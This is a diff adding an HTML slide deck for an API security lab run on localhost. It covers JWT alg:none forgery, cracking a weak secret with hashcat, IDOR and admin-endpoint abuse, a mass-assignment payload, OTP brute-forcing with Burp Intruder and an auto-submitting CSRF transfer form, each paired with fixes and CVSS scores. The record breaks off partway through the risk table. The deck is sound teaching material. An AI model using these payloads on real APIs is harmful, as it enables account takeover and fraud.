@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API Security Lab — Presentation</title>
+<style>
+  /* ── Reset & Base ─────────────────────────────────────── */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg:      #0d1117;
+    --card:    #161b22;
+    --border:  #30363d;
+    --text:    #e6edf3;
+    --muted:   #8b949e;
+    --accent:  #58a6ff;
+    --green:   #3fb950;
+    --red:     #f85149;
+    --orange:  #d29922;
+    --purple:  #bc8cff;
+    --cyan:    #39d0d8;
+  }
+  html, body { width: 100%; height: 100%; background: var(--bg); color: var(--text);
+               font-family: 'Segoe UI', system-ui, sans-serif; overflow: hidden; }
+
+  /* ── Slide Engine ─────────────────────────────────────── */
+  .deck { width: 100vw; height: 100vh; position: relative; }
+  .slide {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+    padding: 48px 64px;
+    opacity: 0; pointer-events: none;
+    transform: translateX(60px);
+    transition: opacity .35s ease, transform .35s ease;
+  }
+  .slide.active {
+    opacity: 1; pointer-events: all; transform: translateX(0);
+  }
+  .slide.exit {
+    opacity: 0; transform: translateX(-60px);
+  }
+
+  /* ── Navigation ───────────────────────────────────────── */
+  #nav {
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+    display: flex; align-items: center; gap: 16px; z-index: 100;
+    background: rgba(22,27,34,.92); border: 1px solid var(--border);
+    border-radius: 40px; padding: 8px 20px; backdrop-filter: blur(8px);
+  }
+  #nav button {
+    background: none; border: 1px solid var(--border); color: var(--text);
+    border-radius: 20px; padding: 6px 18px; cursor: pointer; font-size: .82rem;
+    transition: background .15s, border-color .15s;
+  }
+  #nav button:hover { background: var(--card); border-color: var(--accent); }
+  #nav button:disabled { opacity: .35; cursor: default; }
+  #counter { font-size: .8rem; color: var(--muted); min-width: 56px; text-align: center; }
+  #progress {
+    position: fixed; top: 0; left: 0; height: 3px;
+    background: linear-gradient(90deg, var(--accent), var(--purple));
+    transition: width .35s ease; z-index: 200;
+  }
+
+  /* ── Typography Helpers ───────────────────────────────── */
+  .slide-title {
+    font-size: clamp(1.6rem, 3.5vw, 2.6rem); font-weight: 700;
+    letter-spacing: -.02em; text-align: center; line-height: 1.2;
+  }
+  .slide-subtitle {
+    font-size: clamp(.9rem, 1.8vw, 1.15rem); color: var(--muted);
+    text-align: center; margin-top: 10px; max-width: 780px;
+  }
+  h2.section { font-size: clamp(1.2rem, 2.5vw, 1.9rem); font-weight: 700; margin-bottom: 18px; }
+  .tag {
+    display: inline-block; font-size: .7rem; font-weight: 700; letter-spacing: .06em;
+    padding: 2px 10px; border-radius: 20px; text-transform: uppercase;
+  }
+  .tag-red    { background: rgba(248,81,73,.18);  color: var(--red);    border: 1px solid rgba(248,81,73,.35);  }
+  .tag-orange { background: rgba(210,153,34,.18); color: var(--orange); border: 1px solid rgba(210,153,34,.35); }
+  .tag-green  { background: rgba(63,185,80,.18);  color: var(--green);  border: 1px solid rgba(63,185,80,.35);  }
+  .tag-blue   { background: rgba(88,166,255,.18); color: var(--accent); border: 1px solid rgba(88,166,255,.35); }
+  .tag-purple { background: rgba(188,140,255,.18);color: var(--purple); border: 1px solid rgba(188,140,255,.35);}
+
+  /* ── Cards / Grid ─────────────────────────────────────── */
+  .grid { display: grid; gap: 14px; width: 100%; }
+  .g2 { grid-template-columns: 1fr 1fr; }
+  .g3 { grid-template-columns: 1fr 1fr 1fr; }
+  .g4 { grid-template-columns: 1fr 1fr 1fr 1fr; }
+  .card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 10px; padding: 16px 18px;
+  }
+  .card-title { font-size: .78rem; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: .07em; margin-bottom: 6px; }
+  .card-body  { font-size: clamp(.8rem, 1.3vw, .88rem); line-height: 1.55; }
+
+  /* ── Code blocks ──────────────────────────────────────── */
+  pre {
+    background: #010409; border: 1px solid var(--border);
+    border-radius: 8px; padding: 14px 16px;
+    font-size: clamp(.65rem, 1.1vw, .78rem); line-height: 1.6;
+    overflow-x: auto; width: 100%; color: #c9d1d9;
+  }
+  .kw  { color: #ff7b72; }
+  .str { color: #a5d6ff; }
+  .cmt { color: #8b949e; font-style: italic; }
+  .num { color: #79c0ff; }
+  .key { color: var(--purple); }
+
+  /* ── Tables ───────────────────────────────────────────── */
+  table { width: 100%; border-collapse: collapse; font-size: clamp(.72rem, 1.2vw, .82rem); }
+  th { background: #21262d; color: var(--muted); font-weight: 600; text-transform: uppercase;
+       font-size: .68rem; letter-spacing: .06em; padding: 8px 12px; text-align: left; }
+  td { padding: 7px 12px; border-bottom: 1px solid var(--border); vertical-align: middle; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(88,166,255,.04); }
+
+  /* ── Severity badge ───────────────────────────────────── */
+  .sev-c { color: var(--red);    font-weight: 700; }
+  .sev-h { color: var(--orange); font-weight: 700; }
+  .sev-m { color: var(--cyan);   font-weight: 700; }
+
+  /* ── List ─────────────────────────────────────────────── */
+  ul.steps { list-style: none; width: 100%; }
+  ul.steps li {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 9px 0; border-bottom: 1px solid var(--border);
+    font-size: clamp(.8rem, 1.3vw, .88rem);
+  }
+  ul.steps li:last-child { border-bottom: none; }
+  ul.steps .num-badge {
+    min-width: 22px; height: 22px; background: var(--accent);
+    color: #fff; border-radius: 50%; display: grid; place-items: center;
+    font-size: .7rem; font-weight: 700; margin-top: 2px;
+  }
+
+  /* ── Hero ─────────────────────────────────────────────── */
+  .hero-icon { font-size: 4rem; margin-bottom: 16px; }
+  .divider { width: 60px; height: 3px; background: linear-gradient(90deg, var(--accent), var(--purple));
+             border-radius: 2px; margin: 18px auto; }
+  .chip {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 20px; padding: 4px 14px; font-size: .78rem; color: var(--muted);
+  }
+  .dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; }
+  .dot-red    { background: var(--red); }
+  .dot-orange { background: var(--orange); }
+  .dot-green  { background: var(--green); }
+
+  /* ── Flow diagram boxes ───────────────────────────────── */
+  .flow { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; justify-content: center; width: 100%; }
+  .flow-box {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 8px; padding: 10px 16px; font-size: .8rem; text-align: center; min-width: 110px;
+  }
+  .flow-box .label { font-size: .65rem; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
+  .flow-arrow { color: var(--muted); font-size: 1.1rem; }
+  .flow-box.danger { border-color: var(--red); background: rgba(248,81,73,.08); }
+
+  /* ── Vuln number pill ─────────────────────────────────── */
+  .vpill {
+    display: inline-block; background: rgba(248,81,73,.15); color: var(--red);
+    border: 1px solid rgba(248,81,73,.3); border-radius: 4px;
+    font-size: .65rem; font-weight: 700; padding: 1px 7px; letter-spacing: .04em;
+  }
+
+  /* keyboard shortcut hint */
+  #hint { position: fixed; top: 16px; right: 20px; font-size: .7rem; color: var(--border); z-index: 100; }
+</style>
+</head>
+<body>
+
+<div id="progress"></div>
+<div id="hint">← → Space · Navigate</div>
+
+<div class="deck" id="deck">
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 1 — TITLE
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide active" id="s1">
+    <div class="hero-icon">🔐</div>
+    <div class="slide-title">API Security Lab</div>
+    <div class="divider"></div>
+    <div class="slide-subtitle">
+      Phases 2–6 &nbsp;·&nbsp; Authentication, Authorization, Logic, Rate Limiting,
+      Automated Scanning &amp; Risk Assessment
+    </div>
+    <div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:28px">
+      <span class="chip"><span class="dot dot-red"></span>2 Critical</span>
+      <span class="chip"><span class="dot dot-orange"></span>5 High</span>
+      <span class="chip"><span class="dot" style="background:var(--cyan)"></span>5 Medium</span>
+      <span class="chip">12 Findings Total</span>
+      <span class="chip">Burp Suite Ready</span>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 2 — LAB SETUP
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s2">
+    <h2 class="section">Lab Setup</h2>
+    <div class="grid g2" style="max-width:900px;width:100%">
+      <div class="card">
+        <div class="card-title">File Structure</div>
+        <pre>d:\apisecurity\
+├── <span class="str">server.js</span>       ← Vulnerable API (port 3000)
+├── <span class="str">frontend\</span>        ← Web UI
+├── <span class="str">csrf-poc\</span>        ← Attacker pages (port 4000)
+├── <span class="str">package.json</span>
+└── <span class="str">setup.bat</span>        ← Double-click to start</pre>
+      </div>
+      <div class="card">
+        <div class="card-title">Test Accounts</div>
+        <table>
+          <tr><th>User</th><th>Password</th><th>Role</th><th>ID</th></tr>
+          <tr><td>alice</td><td style="color:var(--accent)">Password123!</td><td><span class="tag tag-blue">user</span></td><td>1</td></tr>
+          <tr><td>bob</td><td style="color:var(--accent)">Bob@secure99</td><td><span class="tag tag-blue">user</span></td><td>2</td></tr>
+          <tr><td>admin</td><td style="color:var(--accent)">AdminPass!456</td><td><span class="tag tag-red">admin</span></td><td>3</td></tr>
+        </table>
+      </div>
+      <div class="card">
+        <div class="card-title">Start Commands</div>
+        <pre><span class="cmt"># Terminal 1 — victim API</span>
+node server.js
+<span class="cmt"># → http://localhost:3000</span>
+
+<span class="cmt"># Terminal 2 — CSRF attacker</span>
+cd csrf-poc
+python -m http.server 4000</pre>
+      </div>
+      <div class="card">
+        <div class="card-title">Burp Suite Config</div>
+        <ul class="steps">
+          <li><span class="num-badge">1</span>Proxy → Listeners → Add <code>127.0.0.1:8080</code></li>
+          <li><span class="num-badge">2</span>Browser → Manual proxy → <code>127.0.0.1:8080</code></li>
+          <li><span class="num-badge">3</span>Target → Scope → <code>http://localhost:3000</code></li>
+          <li><span class="num-badge">4</span>Install <strong>JWT Editor</strong> extension</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 3 — PHASE 2: JWT INTEGRITY
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s3">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-blue">Phase 2</span>
+      <h2 class="section" style="margin:0">Task 3 — JWT / Token Integrity</h2>
+    </div>
+    <div class="grid g3" style="max-width:960px;width:100%">
+      <div class="card">
+        <div class="card-title">V2 — PII in Payload <span class="vpill">5.9 Medium</span></div>
+        <div class="card-body" style="margin-bottom:8px">JWT payload contains:</div>
+        <pre><span class="key">"ssn"</span>:        <span class="str">"123-45-6789"</span>
+<span class="key">"creditCard"</span>: <span class="str">"4111111111111111"</span>
+<span class="key">"balance"</span>:    <span class="num">1500</span></pre>
+        <div class="card-body" style="margin-top:8px;color:var(--muted)">Any proxy/CDN/log that stores the token captures raw PII.</div>
+      </div>
+      <div class="card">
+        <div class="card-title">V1 — Weak Secret <span class="vpill">7.4 High</span></div>
+        <div class="card-body" style="margin-bottom:8px">Secret = <code style="color:var(--red)">secret123</code><br>Crackable in seconds:</div>
+        <pre>hashcat -a 0 -m 16500 \
+  token.txt rockyou.txt
+<span class="cmt"># → secret123</span></pre>
+        <div class="card-body" style="margin-top:8px;color:var(--muted)">Once cracked → forge any token for any user.</div>
+      </div>
+      <div class="card" style="border-color:rgba(248,81,73,.5)">
+        <div class="card-title">V3 — alg:none Bypass <span class="vpill" style="background:rgba(248,81,73,.25)">9.8 CRITICAL</span></div>
+        <div class="card-body" style="margin-bottom:8px">Unsigned token accepted by server:</div>
+        <pre><span class="cmt">Header:</span>  {"alg":"none"}
+<span class="cmt">Payload:</span> {"role":"admin"}
+<span class="cmt">Sig:</span>     (empty)</pre>
+        <pre style="margin-top:6px">eyJhbGciOiJub25lIn0.
+eyJyb2xlIjoiYWRtaW4ifQ.</pre>
+      </div>
+    </div>
+    <div class="card" style="max-width:960px;width:100%;margin-top:14px;background:rgba(88,166,255,.06);border-color:rgba(88,166,255,.3)">
+      <div class="card-title" style="color:var(--accent)">🔍 Cross-Device Token Reuse</div>
+      <div class="card-body">No device fingerprint or IP binding. Token stolen from Device A works in Burp Repeater as Device B. Simply copy the Bearer token and replay it in any request.</div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 4 — PHASE 2: SESSION TERMINATION
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s4">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-blue">Phase 2</span>
+      <h2 class="section" style="margin:0">Task 4 — Session Termination</h2>
+    </div>
+    <div class="grid g2" style="max-width:900px;width:100%">
+      <div class="card">
+        <div class="card-title">V4 — No Invalidation on Logout <span class="vpill">6.5 Medium</span></div>
+        <div class="flow" style="margin:10px 0">
+          <div class="flow-box"><div class="label">Login</div>Token issued</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box"><div class="label">Logout</div>Cookie cleared</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box danger"><div class="label">Replay Token</div>200 OK ✓</div>
+        </div>
+        <pre><span class="cmt"># After logout — token STILL works</span>
+GET /api/profile HTTP/1.1
+Authorization: Bearer &lt;old_token&gt;
+→ 200 OK</pre>
+        <div class="card-body" style="color:var(--muted);margin-top:8px">Fix: maintain server-side token blacklist (Redis SET with TTL matching token expiry).</div>
+      </div>
+      <div class="card">
+        <div class="card-title">V5 — No Invalidation on Password Change <span class="vpill">6.5 Medium</span></div>
+        <div class="flow" style="margin:10px 0">
+          <div class="flow-box"><div class="label">Device A</div>Token saved</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box"><div class="label">Device B</div>Change password</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box danger"><div class="label">Device A</div>Still valid ✓</div>
+        </div>
+        <pre><span class="cmt"># Old session from Device A still works</span>
+GET /api/profile
+Authorization: Bearer &lt;pre_change_token&gt;
+→ 200 OK  ←— should be 401</pre>
+        <div class="card-body" style="color:var(--muted);margin-top:8px">Fix: embed <code>tokenVersion</code> in JWT. Increment on password change. Reject mismatched tokens.</div>
+      </div>
+    </div>
+    <div class="card" style="max-width:900px;width:100%;margin-top:14px;background:rgba(210,153,34,.06);border-color:rgba(210,153,34,.3)">
+      <div class="card-title" style="color:var(--orange)">⚡ Burp Steps: Logout Test</div>
+      <div class="card-body" style="display:flex;gap:24px;flex-wrap:wrap">
+        <span>① Login → save token in Repeater</span>
+        <span>→</span>
+        <span>② POST /api/auth/logout</span>
+        <span>→</span>
+        <span>③ Replay token via Authorization: Bearer</span>
+        <span>→</span>
+        <span>④ Server returns 200 (not 401)</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 5 — PHASE 3: IDOR
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s5">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-orange">Phase 3</span>
+      <h2 class="section" style="margin:0">Task 5 — IDOR (Horizontal &amp; Vertical)</h2>
+    </div>
+    <div class="grid g2" style="max-width:960px;width:100%">
+      <div>
+        <div class="card" style="margin-bottom:12px">
+          <div class="card-title">Horizontal IDOR <span class="vpill">7.1 High</span> — V8</div>
+          <div class="card-body" style="margin-bottom:8px">Logged in as alice (id=1) — access any other user's data:</div>
+          <pre>GET /api/users/<span class="num">2</span> HTTP/1.1
+Authorization: Bearer &lt;alice_token&gt;
+→ bob's SSN, credit card, password
+
+GET /api/users/<span class="num">3</span>/orders
+→ admin's order history
+
+GET /api/transactions?userId=<span class="num">3</span>
+→ admin's transaction history</pre>
+        </div>
+        <div class="card" style="background:rgba(210,153,34,.06);border-color:rgba(210,153,34,.3)">
+          <div class="card-title" style="color:var(--orange)">Burp Intruder — User Enumeration</div>
+          <ul class="steps">
+            <li><span class="num-badge">1</span>Capture <code>GET /api/users/1</code></li>
+            <li><span class="num-badge">2</span>Send to Intruder → mark <code>§1§</code></li>
+            <li><span class="num-badge">3</span>Payload: Numbers 1–1000, step 1</li>
+            <li><span class="num-badge">4</span>Filter: Status 200 = valid user</li>
+          </ul>
+        </div>
+      </div>
+      <div class="card" style="border-color:rgba(248,81,73,.4)">
+        <div class="card-title">Vertical IDOR — No Role Check <span class="vpill">8.8 High</span> — V9</div>
+        <div class="card-body" style="margin-bottom:10px">Admin endpoints accessible with any valid token:</div>
+        <pre><span class="cmt"># Dump all users (incl. passwords)</span>
+GET /api/admin/users
+Authorization: Bearer &lt;alice_token&gt;
+→ 200 OK — full user database
+
+<span class="cmt"># Delete any user</span>
+DELETE /api/admin/users/2
+→ {"message":"Deleted: bob"}
+
+<span class="cmt"># Promote self to admin</span>
+POST /api/admin/promote
+{"userId": 1}
+→ {"message":"alice is now admin"}</pre>
+        <div class="card-body" style="color:var(--muted);margin-top:8px">Fix: <code>requireAdmin</code> middleware on all <code>/api/admin/*</code> routes.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 6 — PHASE 3: BOPLA
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s6">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-orange">Phase 3</span>
+      <h2 class="section" style="margin:0">Task 6 — BOPLA</h2>
+    </div>
+    <div class="grid g2" style="max-width:960px;width:100%">
+      <div class="card">
+        <div class="card-title">V10 — Mass Assignment <span class="vpill">8.1 High</span></div>
+        <div class="card-body" style="margin-bottom:8px">
+          Server uses <code>Object.assign(user, req.body)</code> — no field allowlist.
+          Send any field you want to overwrite:
+        </div>
+        <pre>PUT /api/users/1 HTTP/1.1
+Authorization: Bearer &lt;alice_token&gt;
+Content-Type: application/json
+
+{
+  <span class="key">"email"</span>:    <span class="str">"alice@evil.com"</span>,
+  <span class="key">"role"</span>:     <span class="str">"admin"</span>,      <span class="cmt">← escalation!</span>
+  <span class="key">"balance"</span>:  <span class="num">99999</span>,       <span class="cmt">← fraud!</span>
+  <span class="key">"password"</span>: <span class="str">"iownthis"</span>   <span class="cmt">← takeover!</span>
+}</pre>
+        <pre style="margin-top:8px;color:var(--green)">→ {"role":"admin","balance":99999}</pre>
+      </div>
+      <div class="card">
+        <div class="card-title">V11 — Excessive Data Exposure <span class="vpill">6.5 Medium</span></div>
+        <div class="card-body" style="margin-bottom:8px"><code>GET /api/profile</code> — UI shows 3 fields, API returns 10:</div>
+        <table>
+          <tr><th>Field</th><th>UI</th><th>API</th><th>Risk</th></tr>
+          <tr><td>username / email</td><td>✅</td><td>✅</td><td>—</td></tr>
+          <tr><td>role</td><td>❌</td><td>✅</td><td style="color:var(--orange)">Med</td></tr>
+          <tr><td>ssn</td><td>❌</td><td style="color:var(--red)">✅</td><td class="sev-c">Crit</td></tr>
+          <tr><td>creditCard / cvv</td><td>❌</td><td style="color:var(--red)">✅</td><td class="sev-c">Crit</td></tr>
+          <tr><td>password (plain)</td><td>❌</td><td style="color:var(--red)">✅</td><td class="sev-c">Crit</td></tr>
+        </table>
+        <div class="card-body" style="color:var(--muted);margin-top:8px">Intercept responses in Burp Proxy — hidden fields appear in raw HTTP response even when UI doesn't render them.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 7 — PHASE 4: RATE LIMITING
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s7">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-purple">Phase 4</span>
+      <h2 class="section" style="margin:0">Task 7 — Rate Limiting</h2>
+    </div>
+    <div class="grid g2" style="max-width:960px;width:100%">
+      <div class="card">
+        <div class="card-title">Forgot-Password Spam — V7 <span class="vpill">7.5 High</span></div>
+        <div class="card-body" style="margin-bottom:10px">No cooldown or blocking. 100+ requests accepted.</div>
+        <div class="card-title" style="margin-bottom:8px;color:var(--orange)">Burp Intruder Steps</div>
+        <ul class="steps">
+          <li><span class="num-badge">1</span>Capture <code>POST /api/auth/forgot-password</code></li>
+          <li><span class="num-badge">2</span>Send to Intruder</li>
+          <li><span class="num-badge">3</span>Positions → mark email value with §</li>
+          <li><span class="num-badge">4</span>Payload: <strong>Null payloads</strong> × 100</li>
+          <li><span class="num-badge">5</span>Start → all return <strong>200 OK</strong></li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title">OTP Brute-Force — No Lockout</div>
+        <div class="card-body" style="margin-bottom:10px">6-digit OTP = 1,000,000 combinations. No attempt limit.</div>
+        <pre><span class="cmt">Intruder Payload Settings:</span>
+Type: Numbers
+From: 0  To: 999999  Step: 1
+Min digits: 6  Max digits: 6
+
+Positions tab:
+{"email":"alice@victim.com",
+ "otp":"<span class="str">§000000§</span>"}</pre>
+        <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap">
+          <div class="card" style="flex:1;padding:10px">
+            <div class="card-title">Burp Community</div>
+            <div class="card-body">~50 req/s → cracked in ~5.5 hours</div>
+          </div>
+          <div class="card" style="flex:1;padding:10px;border-color:var(--red)">
+            <div class="card-title" style="color:var(--red)">Burp Pro</div>
+            <div class="card-body">Parallel → cracked in minutes</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="card" style="max-width:960px;width:100%;margin-top:14px">
+      <div class="card-title">Fix</div>
+      <div class="card-body" style="display:flex;gap:32px;flex-wrap:wrap">
+        <span>• <code>express-rate-limit</code>: 5 req / 15 min / IP on forgot-password</span>
+        <span>• Lock OTP after 5 failed attempts</span>
+        <span>• Expire OTP after 5 minutes</span>
+        <span>• CAPTCHA on repeated failures</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 8 — PHASE 5: AUTOMATED SCAN
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s8">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-green">Phase 5</span>
+      <h2 class="section" style="margin:0">Task 8 — Automated Scan vs Manual</h2>
+    </div>
+    <div class="grid g2" style="max-width:960px;width:100%">
+      <div>
+        <div class="card" style="margin-bottom:12px">
+          <div class="card-title" style="color:var(--green)">✅ Found by Scanner</div>
+          <table>
+            <tr><th>Finding</th><th>Ref</th></tr>
+            <tr><td>Cleartext password in response</td><td class="sev-c">V11</td></tr>
+            <tr><td>JWT with sensitive claims</td><td class="sev-c">V2</td></tr>
+            <tr><td>Missing CSRF token</td><td class="sev-h">V12</td></tr>
+            <tr><td>Debug endpoint accessible</td><td class="sev-c">V13</td></tr>
+            <tr><td>Wildcard CORS</td><td class="sev-m">V14</td></tr>
+            <tr><td>Missing cookie security flags</td><td class="sev-m">V6</td></tr>
+          </table>
+        </div>
+        <div class="card" style="background:rgba(248,81,73,.06);border-color:rgba(248,81,73,.3)">
+          <div class="card-title" style="color:var(--red)">❌ False Positives</div>
+          <table>
+            <tr><th>Alert</th><th>Reality</th></tr>
+            <tr><td>XSS in parameter</td><td style="color:var(--muted)">JSON only, not HTML</td></tr>
+            <tr><td>SQL injection</td><td style="color:var(--muted)">In-memory array.filter()</td></tr>
+            <tr><td>Path traversal</td><td style="color:var(--muted)">Static file limits</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="card" style="border-color:rgba(210,153,34,.4)">
+        <div class="card-title" style="color:var(--orange)">⚠ Missed by Scanner (Manual Only)</div>
+        <table>
+          <tr><th>Finding</th><th>Why Scanner Fails</th></tr>
+          <tr><td>Horizontal IDOR</td><td style="color:var(--muted)">No business-logic context</td></tr>
+          <tr><td>Vertical IDOR</td><td style="color:var(--muted)">Requires role awareness</td></tr>
+          <tr><td>alg:none bypass</td><td style="color:var(--muted)">Needs crafted token</td></tr>
+          <tr><td>Token valid after logout</td><td style="color:var(--muted)">Stateful multi-step test</td></tr>
+          <tr><td>Mass assignment</td><td style="color:var(--muted)">Business-logic context</td></tr>
+          <tr><td>OTP brute-force</td><td style="color:var(--muted)">Scale-dependent detection</td></tr>
+        </table>
+        <div class="card-body" style="color:var(--muted);margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
+          <strong style="color:var(--orange)">Key insight:</strong> Automated scans find ~50% of vulnerabilities.
+          Critical logic flaws — IDOR, session management, mass assignment — require manual testing.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 9 — CSRF POC
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s9">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-red">PoC</span>
+      <h2 class="section" style="margin:0">CSRF — Cross-Site Request Forgery</h2>
+    </div>
+    <div class="grid g2" style="max-width:960px;width:100%">
+      <div class="card">
+        <div class="card-title">Why It Works — V6, V12 <span class="vpill">6.5 Medium</span></div>
+        <table style="margin-bottom:10px">
+          <tr><th>Missing Defence</th><th>Consequence</th></tr>
+          <tr><td>No <code>SameSite=Strict</code></td><td>Cookie sent cross-origin</td></tr>
+          <tr><td>No CSRF token</td><td>No secret to forge</td></tr>
+          <tr><td>No <code>Secure</code> flag</td><td>Cookie sent over HTTP</td></tr>
+        </table>
+        <div class="card-title">PoC 1 — Fund Transfer</div>
+        <pre><span class="kw">&lt;form</span> action=<span class="str">"http://localhost:3000/api/transfer"</span>
+      method=<span class="str">"POST"</span> id=<span class="str">"f"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> type=<span class="str">"hidden"</span> name=<span class="str">"toUserId"</span> value=<span class="str">"3"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> type=<span class="str">"hidden"</span> name=<span class="str">"amount"</span>   value=<span class="str">"500"</span><span class="kw">&gt;</span>
+<span class="kw">&lt;/form&gt;</span>
+<span class="kw">&lt;script&gt;</span>f.submit()<span class="kw">&lt;/script&gt;</span>
+<span class="cmt">&lt;!-- Victim's cookie sent automatically --&gt;</span></pre>
+      </div>
+      <div class="card">
+        <div class="card-title">Burp — Generate CSRF PoC</div>
+        <ul class="steps" style="margin-bottom:12px">
+          <li><span class="num-badge">1</span>Capture <code>POST /api/transfer</code> in Proxy</li>
+          <li><span class="num-badge">2</span>Right-click → <em>Engagement tools → Generate CSRF PoC</em></li>
+          <li><span class="num-badge">3</span>Enable "Include auto-submit script"</li>
+          <li><span class="num-badge">4</span>Click <strong>Test in browser</strong> (Burp Chromium bypasses SameSite)</li>
+          <li><span class="num-badge">5</span>$500 transferred from victim to attacker account</li>
+        </ul>
+        <div class="card-title">PoC 2 — Privilege Escalation</div>
+        <div class="card-body">
+          <code>csrf_promote.html</code> sends<br>
+          <code>PUT /api/users/1 {"role":"admin"}</code><br>
+          using alice's cookie → alice becomes admin.<br>
+          <span style="color:var(--muted)">Attacker page disguised as a survey.</span>
+        </div>
+        <div class="card-title" style="margin-top:10px">Note on SameSite Lax (Chrome 80+)</div>
+        <div class="card-body" style="color:var(--muted)">Blocks cross-site POST in modern browsers. Still affects older browsers, Safari WebViews, and Burp's embedded browser. Server MUST set the flag explicitly.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════
+       SLIDE 10 — RISK MATRIX
+  ══════════════════════════════════════════════════════ -->
+  <div class="slide" id="s10">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px">
+      <span class="tag tag-red">Phase 6</span>
+      <h2 class="section" style="margin:0">Task 9 — Risk Assessment</h2>
+    </div>
+    <div style="max-width:980px;width:100%;overflow:auto">
+      <table>
+        <thead>
+          <tr><th>#</th><th>Vulnerability</th><th>OWASP API 2023</th><th>OWASP MASVS</th><th>CVSS v3.1</th><th>Score</th><th>Severity</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>1</td><td>Debug endpoint — JWT secret exposed</td><td>API8</td><td>MASVS-RESILIENCE-2</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</td><td class="sev-c">9.1</td><td class="sev-c">Critical</td></tr>
+          <tr><td>2</td><td>JWT alg:none bypass</td><td>API2</td><td>MASVS-AUTH-1</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</td><td class="sev-c">9.8</td><td class="sev-c">Critical</td></tr>
+          <tr><td>3</td><td>Weak JWT secret</td><td>API2</td><td>MASVS-CRYPTO-1</td><td>AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</td><td class="sev-h">7.4</td><td class="sev-h">High</td></tr>
+          <tr><td>4</td><td>Vertical IDOR — admin endpoints</td><td>API5</td><td>MASVS-AUTH-3</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</td><td class="sev-h">8.8</td><td class="sev-h">High</td></tr>
+          <tr><td>5</td><td>Mass assignment — role escalation</td><td>API3</td><td>MASVS-AUTH-3</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</td><td class="sev-h">8.1</td><td class="sev-h">High</td></tr>
+          <tr><td>6</td><td>Horizontal IDOR</td><td>API1</td><td>MASVS-AUTH-3</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N</td><td class="sev-h">7.1</td><td class="sev-h">High</td></tr>
+          <tr><td>7</td><td>No rate limit on OTP</td><td>API4</td><td>MASVS-AUTH-1</td><td>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td><td class="sev-h">7.5</td><td class="sev-h">High</td></tr>
